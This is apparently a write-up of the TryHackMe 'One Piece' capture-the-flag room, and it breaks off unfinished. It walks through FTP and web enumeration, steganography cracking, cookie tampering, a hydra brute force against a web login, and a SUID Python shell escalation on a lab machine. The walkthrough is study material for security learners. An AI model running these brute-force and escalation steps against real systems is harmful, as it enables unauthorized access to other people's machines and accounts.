<img width="1125" height="648" alt="image" src="https://github.com/user-attachments/assets/d820bd6b-33de-4955-b07a-72f2b0d8a910" /># **One Piece - TryHackMe**

*Target Ip. Address: 10.49.130.3*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.49.130.3
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 14:44 +0545
Nmap scan report for 10.49.130.3
Host is up (0.050s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 01:18:18:f9:b7:8a:c3:6c:7f:92:2d:93:90:55:a1:29 (RSA)
|   256 cc:02:18:a9:b5:2b:49:e4:5b:77:f9:6e:c2:db:c9:0d (ECDSA)
|_  256 b8:52:72:e6:2a:d5:7e:56:3d:16:7b:bc:51:8c:7b:2a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: New World
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
```

So, we have 3 ports. Port 21 (ftp with anonymous login), poet 22 (ssh) and port 80 (http). Let's begin with anonymous ftp.

```bash
kali@kali:ftp 10.49.130.3
Connected to 10.49.130.3.
220 (vsFTPd 3.0.3)
Name (10.49.130.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

We are in. Let's see the files, directories we get from ftp.

```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||59076|)                                                                                                     
150 Here comes the directory listing.                                                                                                              
drwxr-xr-x    3 0        0            4096 Jul 26  2020 .
drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 26  2020 .the_whale_tree
-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
```

We have a file and a hidden directory. Ensure you don't miss that hidden directory. Let's head inside the directory.

```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||52117|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 26  2020 .
drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
-rw-r--r--    1 0        0            8652 Jul 26  2020 .road_poneglyph.jpeg
-rw-r--r--    1 0        0            1147 Jul 26  2020 .secret_room.txt
226 Directory send OK.
```

2 more hidden files, download all the files to the attacker machine.

```bash
kali@kali;cat secret_room.txt                                                                                                                            
Inuarashi: You reached the center of the Whale, the majestic tree of Zou.
Nekomamushi: We have hidden this place for centuries.
Inuarashi: Indeed, it holds a secret.
Nekomamushi: Do you see this red stele ? This is a Road Poneglyph.
Luffy: A Road Poneglyph ??
Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.
Luffy: The One Piece ?? That's my dream ! I will find it and I will become the Pirate King !!!
Nekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King.
Inuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one.
Nekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won't be able to take them down easily.
Luffy: I will show them, there can be only one Pirate King and it will be me !!
Inuarashi: There is another issue regarding the Road Poneglyph.
Nekomamushi: They are written in an ancient language and a very few people around the world can actually read them. 
```

We get 1 road poneglyph. Need to find 3 more.

```bash
kali@kali:steghide --extract -sf road_poneglyph.jpeg 
Enter passphrase: 
wrote extracted data to "road_poneglyphe1.txt".
```

We extracted first hint wihtout passphrase.

```bash
kali@kali:cat road_poneglyphe1.txt                                                                                                                       
FUWS2LJNEAWS2LJ......FUWS2IBNFUWS2LIK
```

Now, let's head to the website.

```html
    <p>
        Straw Hat Luffy and his crew are sailing in the New World. <br/>
        They have only one thing in mind, reach the One Piece and hence become the Pirate King, that is to say the freest man in the world.<br/>
        <br/>
        Unfortunately, your navigator Nami lost the Log Pose and as you know, it is not possible to properly steer without it.<br/>
        You need to find the Log Pose to be able to reach the next island.
        <!--J5VEKNCJKZ.....NQTGTJ5-->
    </p>
```

We find something interesting in source code, it looks like base32 encoded. Let's decode it using cyberchef.

<img width="1527" height="757" alt="image" src="https://github.com/user-attachments/assets/6e5023aa-d94b-44c3-a1c4-3b1382299771" />

It was decoded in base32, base64 then base85 in order.

So, the hint is to search for log pose. I don't know what to do after this.

<img width="1840" height="890" alt="image" src="https://github.com/user-attachments/assets/3ebce50d-02f1-442e-9708-36c15d0382cd" />

After a bit of googling around, I found a repository called LogPose, and the owner of repository is the creator of this challenge. That's good.

It tells that it will lead us to another island, and we have a wordlist. The wordlists looks like a directory list, let's use gobuster.

```bash
kali@kali:gobuster dir -u http://10.49.130.3 -w LogPose.txt -x php,html,txt                                                                          
===============================================================                                                                                   
Gobuster v3.8.2                                                                                                                                   
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.130.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                LogPose.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
d...4.html       (Status: 200) [Size: 3985]
Progress: 13888 / 13888 (100.00%)
===============================================================
Finished
===============================================================
```

We get 1 hit, let's go to that endpoint.

```html
        <div class="bg"></div>
        <div class="bg"></div>
        <img id="background" src="./images/rabbit_hole.png"/>
    </div>
```

We see a rabbit_hole.png. Will get back to it later if need be.

```css
#container {
    height: 75vh;
    width: 90vw;
    margin: 1vh;
    background-image: url("../k...n.jpg");
    background-repeat: no-repeat;
    background-position: center;
    background-size: cover;
    display: flex;
    flex-direction: row;
    justify-content: center;
    align-items: flex-start;
    align-content: flex-start;
    flex-wrap: wrap;
    position: relative;
}
```

We actually find next hint in the css file.

Let's download that image and see what we can do with it.

```bash
kali@kali:steghide --extract -sf other_hint.jpg                                                                                                         
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Empty passphrase fails here.

```bash
kali@kali:exiftool other_hint.jpg                                                                                                                       
ExifTool Version Number         : 13.44
File Name                       : other_hint.jpg
Directory                       : .
File Size                       : 43 kB
File Modification Date/Time     : 2026:02:18 15:19:46+05:45
File Access Date/Time           : 2026:02:18 15:19:55+05:45
File Inode Change Date/Time     : 2026:02:18 15:19:46+05:45
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Comment                         : Do....jpg
Image Width                     : 736
Image Height                    : 414
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 736x414
Megapixels                      : 0.305
```

We find another hint (url) in the image metadata, let's download that.

```bash
kali@kali:steghide --extract -sf other_hint2.jpg                                                                                                        
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
```bash
kali@kali:exiftool other_hint2.jpg                                                                                                                      
ExifTool Version Number         : 13.44
File Name                       : other_hint2.jpg
Directory                       : .
File Size                       : 176 kB
File Modification Date/Time     : 2026:02:18 15:22:38+05:45
File Access Date/Time           : 2026:02:18 15:22:53+05:45
File Inode Change Date/Time     : 2026:02:18 15:22:38+05:45
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1280
Image Height                    : 720
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1280x720
Megapixels                      : 0.922
```

Nothing from steghide and exiftool, let's try strings.

```bash
kali@kali:strings other_hint2.jpg                                                                                                                       
JFIF
2BQa#Rbqr
&5Ts
6EUdt
w5!]
I>[jK
w}+`
[' >t
bAZV
MuX_5
:1WB
.
.
.
.
.
[|xb
'8,6
<$cq,9r
Ts;}
Congratulations, this is the Log Pose that should lead you to the next island: /w...3.php
```

We get a hint for endpoint from strings command.

<img width="1167" height="620" alt="image" src="https://github.com/user-attachments/assets/93ba7122-840d-49c7-92bc-10580cc27cae" />

So, we need to find a way to appease Big Mom. 

```html
    <p>
        You are on Whole Cake Island. This is the territory of Big Mom, one of the 4 Emperors, this is to say one of the 4 pirates the closest to the One Piece but also the strongest.</br>
        Big Mom chases you and want to destroy you. It is unthinkable to fight her directly.<br/>
        You need to find a way to appease her.
        <!--Big Mom likes cakes-->
    </p>
```

The hint tells us she likes cakes. In cookie section, we see that it is set to 'NoCakeForYou', let's try changing it to 'CakeForYou'.

<img width="1125" height="647" alt="image" src="https://github.com/user-attachments/assets/b6ddbbd0-d41e-4ada-98b5-7067bdaa7ca8" />

That was successful, we got 2nd road poneglyph and a hint for next endpoint.

```bash
kali@kali: cat road_poneglyph2.txt                                                                                                                       
FUWS2LJNEAWS2LJNFUQC4LJNF.....NFUWSALJNFUWS2IBNFUWS2LJA
```

<img width="1062" height="533" alt="image" src="https://github.com/user-attachments/assets/58444ebe-f87d-443e-9ad2-45c0dfae101e" />

We get 2 choices of game "Brick Breaker" and "Brain Teaser". Without going down the rabbit hole, we find the next endpoint hint on js file of Brain Teaser.

```js
var xDegOld = 0;
var yDegOld = 0;
var xDegNew = 0;
var yDegNew = 0;
var xCoordNew = 0;
var yCoordNew = 0;
var screenWidth = document.querySelector("body").clientWidth;
console.log(screenWidth)
var screenHeight = document.querySelector("body").clientHeight;
console.log(screenHeight)
var cube = document.getElementById("container__animation");

function degDetermination(){
  xDegOld = xDegNew;
  yDegOld = yDegNew;
  xDegNew = - (-180 + yCoordNew / screenHeight * 360) / 4;
  yDegNew = (-180 + xCoordNew / screenWidth * 360) / 4;
};

function cubeMovement(){
    degDetermination();
    cube.animate([
      { transform: "rotateX(" + xDegOld + "deg) rotateY(" + yDegOld + "deg)" }, 
      { transform: "rotateX(" + xDegNew + "deg) rotateY(" + yDegNew + "deg)" }
    ], { 
      duration: 10,
    });
    cube.style.transform = "rotateX(" + xDegNew + "deg) rotateY(" + yDegNew + "deg)"
  };

document.getElementById('back').textContent = "Log Pose: /0...4.php"  

window.addEventListener("mousemove", function(e){
  xCoordNew = e.clientX;
  yCoordNew = e.clientY;
  cubeMovement();
});
```

Let's head to that endpoint.

<img width="1123" height="707" alt="image" src="https://github.com/user-attachments/assets/5524d8c8-634a-4893-86a8-7be18cada814" />

We have a login option with credentials or upload file option.

It is hinting for not to try brute force. Brute forcing login is not good here as we have no clear usernames. Since, kaido's image is jpeg file and we have been using steghide. That can be of help.

```bash
kali@kali:steghide --extract -sf kaido.jpeg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

That didn't work, let's try to brute our way in using stegseek.

```bash
kali@kali:stegseek kaido.jpeg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "im...st"       
[i] Original filename: "kaido_login.txt".
[i] Extracting to "kaido.jpeg.out"
```

That worked. Let's what it have for us.

```bash
kali@kali:cat kaido.jpeg.out                                                                                                                            
Username:K1...ts
```

We now have usernames, maybe we can now try to brute force the login option with hydra.

```bash
kali@kali:hydra -l K1...ts -P /usr/share/wordlists/rockyou.txt 10.49.130.3 http-post-form "/0...4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR"
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-18 15:49:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.49.130.3:80/0...4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR
[STATUS] 1454.00 tries/min, 1454 tries in 00:01h, 14342945 to do in 164:25h, 16 active
[STATUS] 1301.33 tries/min, 3904 tries in 00:03h, 14340495 to do in 183:40h, 16 active
[STATUS] 1610.71 tries/min, 11275 tries in 00:07h, 14333124 to do in 148:19h, 16 active
[80][http-post-form] host: 10.49.130.3   login: K1...ts   password: t...t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-18 16:00:18
```

Well, that took forever but worked. Should have increased the tasks.

<img width="1162" height="698" alt="image" src="https://github.com/user-attachments/assets/66beb51b-5ef3-4fe7-a0d7-c67cd942c0e9" />

We get third road poneglyph, but no further hints from here.

```bash
kali@kali: cat road_poneglyph3.txt                                                                                                                       
FYWS2LJNEAXC2LJNFUFC2L.....JNFUWS2IBOFUWS2LIK
```

```hint
You succeed to run away and there is only one Road Poneglyph left to find to be able to reach Laugh Tale. Unfortunately, the location of this last Poneglyph is unspecified.
```

The hint is in there only. It is in /unspecified. We find the last road poneglyph.

```bash
kali@kali:cat road_poneglyph4.txt                                                                                                                       
FUWS2LJNEAWS2LJNFUQC4LJNF.....NFUWSALRNFUWS2IBOFUWS2LI=
```

Let's add all 4 road poneglyph and decode it in cyberchef.

<img width="1532" height="833" alt="image" src="https://github.com/user-attachments/assets/b64008d9-31da-417e-b40d-fbeefa7553b7" />

That was lot's of decoding. 

```decode
base32 -> morse -> binary -> hex -> base58 -> base64
```

We got ourselves a pair of ssh-keys, let's login via ssh.

```bash
kali@kali:ssh M0nk3y_D_7uffy@10.49.130.3
The authenticity of host '10.49.130.3 (10.49.130.3)' can't be established.
ED25519 key fingerprint is: SHA256:nL2dVf0XNxY1c00+jMSTep+9eHaHoDI9XIfe/nIVlRA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.130.3' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
M0nk3y_D_7uffy@10.49.130.3's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-041500-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


18 packages can be updated.
13 updates are security updates.

Last login: Fri Aug 14 15:23:58 2020 from 192.168.1.7
M0nk3y_D_7uffy@Laugh-Tale:~$
```

We logged in successfully. 

```bash
M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt 
Finally, we reached Laugh Tale.
All is left to do is to find the One Piece.
Wait, there is another boat in here.
Be careful, it is the boat of M----------h, one of the 4 Emperors. He is the one that led your brother Ace to his death.
You want your revenge. Let's take him down !
```

We get a flag/hint from here.

We don't have sudo privileges, let's check SUID.

```bash
M0nk3y_D_7uffy@Laugh-Tale:~$ find / -perm -u=s 2>/dev/null
/bin/mount
/bin/ping
/bin/umount
.
.
/usr/bin/chsh
/usr/bin/gomugomunooo_king_kobraaa
/usr/bin/chfn
/usr/bin/arping
/usr/sbin/pppd
/usr/lib/snapd/snap-confine
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

This is so one piece themed "/usr/bin/gomugomunooo_king_kobraaa". Let's see what it does.

```bash
M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

This is python in disguise. We can escalte with this.

```bash
M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os;
>>> os.execl("/bin/sh", "sh", "-p")
$ id
uid=1001(M0nk3y_D_7uffy) gid=1001(luffy) euid=1000(7uffy_vs_T3@ch) groups=1001(luffy)
```

Now, we are as user 7uffy_vs_T3@ch.

```bash
$ cat .password.txt
7uffy_vs_T3@ch:W...g?
```

We find password of '7uffy_vs_T3@ch' in teach home directory. Let's switch with password for proper tty.

```bash
M0nk3y_D_7uffy@Laugh-Tale:~$ su 7uffy_vs_T3@ch
Password: 
7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ 
```

Another flag/hint at home directory.

```bash
7uffy_vs_T3@ch@Laugh-Tale:~$ cat luffy_vs_teach.txt 
This fight will determine who can take the One Piece and who will be the next Pirate King.
These 2 monsters have a matchless will and none of them can let the other prevail.
Each of them have the same dream, be the Pirate King.
For one it means: Take over the World.
For the other: Be the freest man in the World.
Each of their hit creates an earthquake felt on the entire island.
But in the end, Luffy thanks to his w-------r won the fight.
Now, he needs to find the One Piece.
```

Let's check the sudo privileges.

```bash
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo -l
[sudo] password for 7uffy_vs_T3@ch: 
Matching Defaults entries for 7uffy_vs_T3@ch on Laugh-Tale:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
    (ALL) /usr/local/bin/less
```

We can run '/usr/local/bin/less' as root. Quick look on "*https://gtfobins.org/gtfobins/less/*", we have privilege escalation for it.




To be continued.....








